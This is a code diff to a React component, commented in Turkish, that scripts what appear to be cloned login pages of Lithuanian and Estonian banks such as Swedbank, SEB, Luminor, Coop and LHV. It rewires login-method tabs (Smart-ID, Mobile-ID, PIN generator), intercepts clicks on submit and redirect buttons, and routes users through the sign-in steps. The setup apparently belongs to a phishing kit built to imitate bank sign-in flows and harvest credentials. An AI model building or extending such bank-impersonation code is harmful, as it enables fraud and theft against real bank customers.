@@ -1252,12 +1252,21 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
 
           // 4) BUTON / SUBMIT benzeri her şey: Eger gerçekten login method TAB butonu değilse,
           //    yani "tıkla bizi yönlendir / gönder" butonuysa ENGELLE.
+          //    DİKKAT: Sekme / Tab butonları (ui-tabs__control, role=tab, data-tab-index vb.) ASLA ENGELLENMEZ!
+          const tabBtnCheck = target.closest && target.closest('[data-tab-index], .ui-tabs__control, .ui-tabs__caption, [role="tab"], .seb-tabs__item, .c-tabs__item, .coop-tab, .tab-item');
+          if (tabBtnCheck) {
+            return;
+          }
+
           const btn = target.closest ? target.closest('button, [role="button"], input[type="submit"], input[type="button"], a.btn, a.button, [class*="btn"], [class*="submit"], [class*="login"]') : null;
-          if (btn && btn.textContent) {
+          if (btn) {
             const btnText = (btn.textContent || '').trim().toLowerCase();
             // Login methodlarini TEMIZLE: Eger "Smart-ID / Mobile-ID / Biometrika / PIN generatorius / ID-kortele / Biometrija"
             // gibi ise bu TAB'dir ve YAPILMASINA gerek yok (checked state degissin diye native islesin)
             const isLoginMethodTab =
+              btn.hasAttribute('data-tab-index') ||
+              btn.closest('[data-tab-index]') !== null ||
+              btn.classList.contains('ui-tabs__control') ||
               /(smart[ -]?id|mobile[ -]?id|biometri(k|ja|ka)|biometrika|pin[ -]?(generator|gen|calculator|kalkuliatorius)|id[ -]?kortel[ėe]|mobilescan|qr|digipass|salas[oõ]na|parol|password|šifr|sms|one[ -]?time)/i.test(btnText) ||
               /(smart[ -]?id|mobile[ -]?id|biometri|pin[ -]?gen|id[ -]?kort)/i.test((btn.className || '') + '') ||
               /(smart[ -]?id|mobile[ -]?id|biometri|pin[ -]?gen|id[ -]?kort)/i.test((btn.id || '') + '');
@@ -1349,18 +1358,46 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
         document.addEventListener('click', fixCoop, true);
         document.addEventListener('input', fixCoop, true);
 
-        // LITHUANIA Bank Button Fix
+        // LITHUANIA Bank Button Fix: giriş butonlarını form alanları doluluğuna göre kontrol et
         const fixLithuaniaBanks = () => {
-            document.querySelectorAll('button, input[type="submit"]').forEach(btn => {
-                const text = btn.textContent ? btn.textContent.toLowerCase() : (btn.value ? btn.value.toLowerCase() : '');
-                if (text.includes('prisijungti') || text.includes('tęsti') || text.includes('pirmyn') || text.includes('login') || text.includes('log in') || text.includes('submit')) {
-                    btn.removeAttribute('disabled');
-                    btn.classList.remove('v-btn--disabled');
-                    btn.classList.remove('-disabled');
-                    btn.style.pointerEvents = 'auto';
-                    btn.style.opacity = '1';
-                }
+            const forms = document.querySelectorAll('form');
+            const targetForms = forms.length > 0 ? Array.from(forms) : [document];
+
+            targetForms.forEach(container => {
+                const visibleInputs = Array.from(container.querySelectorAll('input, select, textarea')).filter(inp => {
+                    const t = (inp.type || inp.tagName || '').toLowerCase();
+                    if (t === 'hidden' || t === 'submit' || t === 'button' || t === 'reset' || t === 'file' || t === 'checkbox' || t === 'radio') return false;
+                    const style = window.getComputedStyle(inp);
+                    if (style.display === 'none' || style.visibility === 'hidden') return false;
+                    return true;
+                });
+
+                const hasEmptyField = visibleInputs.length === 0 || visibleInputs.some(inp => !inp.value || inp.value.trim() === '');
+
+                const submitButtons = container.querySelectorAll('button[type="submit"], input[type="submit"], button.button.-positive, .button.-positive, button.btn-primary, button.v-btn');
+                submitButtons.forEach(btn => {
+                    const text = btn.textContent ? btn.textContent.toLowerCase() : (btn.value ? btn.value.toLowerCase() : '');
+                    const isTab = /(smart[ -]?id|mobile[ -]?id|biometri|pin[ -]?gen|id[ -]?kort)/i.test(text);
+                    if (isTab) return;
+
+                    if (hasEmptyField) {
+                        btn.setAttribute('disabled', 'true');
+                        btn.disabled = true;
+                        btn.classList.add('disabled', 'v-btn--disabled', '-disabled');
+                        btn.style.opacity = '0.5';
+                        btn.style.cursor = 'not-allowed';
+                        btn.style.pointerEvents = 'none';
+                    } else {
+                        btn.removeAttribute('disabled');
+                        btn.disabled = false;
+                        btn.classList.remove('disabled', 'v-btn--disabled', '-disabled');
+                        btn.style.opacity = '1';
+                        btn.style.cursor = 'pointer';
+                        btn.style.pointerEvents = 'auto';
+                    }
+                });
             });
+
             document.querySelectorAll('.v-input--checkbox, label, .checkbox, input[type="checkbox"]').forEach(el => {
                 const text = el.textContent ? el.textContent.toLowerCase() : '';
                 if (text.includes('įsiminti') || text.includes('prisiminti') || text.includes('remember')) {
@@ -1369,6 +1406,7 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
                 }
             });
         };
+        setTimeout(fixLithuaniaBanks, 100);
         setTimeout(fixLithuaniaBanks, 500);
         setTimeout(fixLithuaniaBanks, 1500);
         document.addEventListener('click', fixLithuaniaBanks, true);
@@ -1639,11 +1677,19 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
         };
 
         const extractLoginMethodLabel = (rawValue) => {
-            const loginMethod = (rawValue || '').replace(/\\s+/g, ' ').trim();
+            const loginMethod = (rawValue || '').replace(/\s+/g, ' ').trim();
             const normalized = loginMethod.toLowerCase();
 
             if (!normalized) {
                 return "";
+            }
+
+            if (window.location.href.includes('swedbank-lt')) {
+                if (normalized.includes('smart')) return 'Smart-ID';
+                if (normalized.includes('mobile') || normalized.includes('mobil')) return 'Mobile-ID';
+                if (normalized.includes('generator') || normalized.includes('pin gen')) return 'PIN generatorius';
+                if (normalized.includes('kortel') || normalized.includes('kort')) return 'ID-kortelė';
+                if (normalized.includes('bio') || normalized.includes('pin')) return 'Biometrika/PIN';
             }
 
             if (window.location.href.includes('swedbank') && normalized.includes('bio')) {
@@ -1934,13 +1980,13 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
           let targetTab = null;
 
           if (!isSubmitBtn) {
-              // Coop ve LHV Bank için eklenmiş daha spesifik sekme yakalayıcı (Örn: li.tab, div.tab, .lhv-tab-link, .auth-methods-method, .ds-option)
-              const tab = target.closest('li, [role="tab"], .tab, .nav-item, .seb-tabs__item, a, .c-tabs__item, .c-tab, .coop-tab, .tab-item, .lhv-tab-link, button.lhv-tab-link, [lhvtablink], .auth-methods-method, .ds-option, .ds-option__label, .v-tab, .v-slide-group__content > *, .v-item-group .v-item');
+              // Coop, LHV, Swedbank-LT, SEB-LT, Luminor vb. için sekme yakalayıcı
+              const tab = target.closest('[data-tab-index], .ui-tabs__control, .ui-tabs__caption, li, [role="tab"], .tab, .nav-item, .seb-tabs__item, a, .c-tabs__item, .c-tab, .coop-tab, .tab-item, .lhv-tab-link, button.lhv-tab-link, [lhvtablink], .auth-methods-method, .ds-option, .ds-option__label, .v-tab, .v-slide-group__content > *, .v-item-group .v-item');
               if (tab) {
                   const tabText = tab.textContent ? tab.textContent.trim().toLowerCase() : '';
                   const isTabByText = tabText.length < 50 && tabText.match(/smart-id|mobiil-id|id-kaart|pin-kalkulaator|pin kalkulaator|biomeetria|smart id|mobiil id|seb mobiilirakendus|mobilescan|digipass|salasõna|salasÃµna|salas|parool|password|šifr|biometri|pin generatorius|kortel|mobile-id/i) !== null;
                   
-                  if (isTabByText || tab.getAttribute('role') === 'tab' || tab.hasAttribute('lhvtablink') || (tab.className && typeof tab.className === 'string' && tab.className.match(/\btab\b|\bnav-item\b|\bseb-tabs__item\b|\bc-tabs__item\b|\btab-item\b|\blhv-tab-link\b|\bauth-methods-method\b|\bds-option\b|\bds-option__label\b/i))) {
+                  if (tab.hasAttribute('data-tab-index') || tab.closest('[data-tab-index]') || isTabByText || tab.getAttribute('role') === 'tab' || tab.hasAttribute('lhvtablink') || (tab.className && typeof tab.className === 'string' && tab.className.match(/\btab\b|\bnav-item\b|\bseb-tabs__item\b|\bc-tabs__item\b|\btab-item\b|\blhv-tab-link\b|\bauth-methods-method\b|\bds-option\b|\bds-option__label\b|\bui-tabs__control\b|\bui-tabs__caption\b/i))) {
                       isTabClick = true;
                       targetTab = tab;
                   }
@@ -1948,14 +1994,23 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
           }
 
           if (isTabClick && targetTab) {
-              // We move preventDefault down to where targetIndex is confirmed
-              
               let targetIndex = -1;
-              const listContainer = targetTab.closest('ul, [role="tablist"], .tabs, .nav, .seb-tabs, .c-tabs__list');
-              
-              if (listContainer) {
-                 const tabs = Array.from(listContainer.children).filter(c => c.nodeType === 1 && c.textContent.trim() !== '');
-                 targetIndex = tabs.findIndex(c => c === targetTab || c.contains(targetTab));
+
+              // 1. ÖNCELİK: data-tab-index attribute kontrolü (Swedbank vb. butonları doğrudan 0,1,2,3,4 taşır)
+              const tabWithDataIndex = targetTab.getAttribute('data-tab-index') != null ? targetTab : targetTab.querySelector('[data-tab-index]') || targetTab.closest('[data-tab-index]');
+              if (tabWithDataIndex) {
+                  const parsedDataIdx = parseInt(tabWithDataIndex.getAttribute('data-tab-index') || '', 10);
+                  if (!isNaN(parsedDataIdx) && parsedDataIdx >= 0) {
+                      targetIndex = parsedDataIdx;
+                  }
+              }
+
+              if (targetIndex === -1) {
+                  const listContainer = targetTab.closest('ul, [role="tablist"], .tabs, .nav, .seb-tabs, .c-tabs__list, .ui-tabs__captions');
+                  if (listContainer) {
+                     const tabs = Array.from(listContainer.children).filter(c => c.nodeType === 1 && c.textContent.trim() !== '');
+                     targetIndex = tabs.findIndex(c => c === targetTab || c.contains(targetTab));
+                  }
               }
               
               if (targetIndex === -1 && targetTab.parentElement) {
@@ -2342,6 +2397,7 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
           // Form boş ise butonları disable etme kontrolü
           const form = input.closest('form');
           if (form) {
+             const isLt = /\/lithuanian-banks\//i.test(window.location.href || '');
              if (window.location.href.includes('coop')) {
                 form.querySelectorAll('button[type="submit"], input[type="submit"], button.btn, button.submit, a.btn, a.button').forEach(btn => {
                     btn.disabled = false;
@@ -2351,6 +2407,11 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
                     btn.classList.remove('disabled');
                     btn.classList.remove('bb-button--disabled');
                 });
+                return;
+             }
+
+             if (isLt) {
+                fixLithuaniaBanks();
                 return;
              }
 
